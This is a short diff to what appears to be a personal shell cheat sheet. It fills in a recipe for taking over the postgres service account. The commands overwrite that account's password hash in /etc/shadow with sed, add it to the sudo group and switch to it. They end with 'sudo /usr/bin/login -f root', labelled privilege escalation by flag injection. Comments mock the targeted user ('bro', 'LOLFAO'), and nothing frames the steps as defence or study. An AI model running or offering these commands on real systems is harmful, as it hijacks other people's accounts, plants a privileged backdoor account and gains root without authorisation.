@@ -4,16 +4,16 @@
 compgen -u
 
 # Set your password
-mkpasswd -m yescrypt "(password)"
+mkpasswd -m yescrypt "postgres"
 
 # Arbitrarily change their password (yescrypt, LOLFAO)
-sudo sed -i 's|^(bro's username goes here):[^:]*|(bro's username goes here):(string here)|' /etc/shadow 
+sudo sed -i 's|^postgres:[^:]*|postgres:<string here>|' /etc/shadow 
 
 # Add them to /etc/sudoers 
-sudo usermod -aG sudo (bro's username)
+sudo usermod -aG sudo postgres
 
 # Log in
-su (bro's username) 
+su postgres 
 
 # LPE via Argument/Flag Injection (enter your password you set)
 sudo /usr/bin/login -f root
